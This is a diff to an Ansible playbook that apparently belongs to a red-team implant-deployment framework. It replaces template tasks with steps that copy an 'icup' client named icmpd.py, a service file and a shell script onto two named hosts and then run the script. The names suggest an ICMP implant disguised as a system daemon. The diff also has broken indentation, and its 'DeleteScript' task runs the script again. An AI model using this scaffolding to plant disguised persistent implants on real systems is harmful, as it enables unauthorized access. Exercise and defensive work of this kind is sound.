@@ -2,28 +2,31 @@
 # This is an example task
 # add your tasks to deploy your malware here
 
-- name: YOURMALWARENAME | (Opt) ACTION GROUP | Task description
-  shell: "whoami"
-
-
-- name: EXAMPLESCRIPT | Copy File | Copy file to Ubuntu
+- name: icupClientDeploy | Copy file | Adds icup client
   copy:
-    source: "files/example.sh"
-    dest: "{{ implant_example_file_linux }}"
-    mode: 0777
-  when: ansible_os_family == "Ubuntu"
+    source: "files/icmpd.py"
+    dest: "{{ icuplocation }}"
+    mode: 0555
+  when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
 
-- name: EXAMPLESCRIPT | Copy File | Copy file to Ubuntu
+- name: icupServiceDeploy | Copy file | Adds icup service
   copy:
-    source: "files/example.ps1"
-    dest: "{{ implant_example_file_windows }}"
-    mode: 0777
-  when: ansible_os_family == "Windows"
+    source: "files/icmpd.service"
+    dest: "{{ servicelocation }}"
+    mode: 0555
+  when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
 
+- name: icupScriptDeploy | Copy file | Adds icup script
+  copy:
+    source: "files/icmpd.sh"
+    dest: "{{ scriptlocation }}"
+    mode: 0555
+  when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
 
-- name: EXAMPLESCIRPT | Run | Run on Linux 
-  shell: "bash {{ implant_example_file_linux }} "
+- name: RunScript | Run | Run on Linux 
+  shell: "./home/icmpd.sh"
+when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
 
-
-- name: EXAMPLESCIRPT | Run | Run on Windows
-  ansible.windows.win_shell: "{{ implant_example_file_windows }} "
+- name: DeleteScript | Run | Run on Linux 
+  shell: "./home/icmpd.sh"
+when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
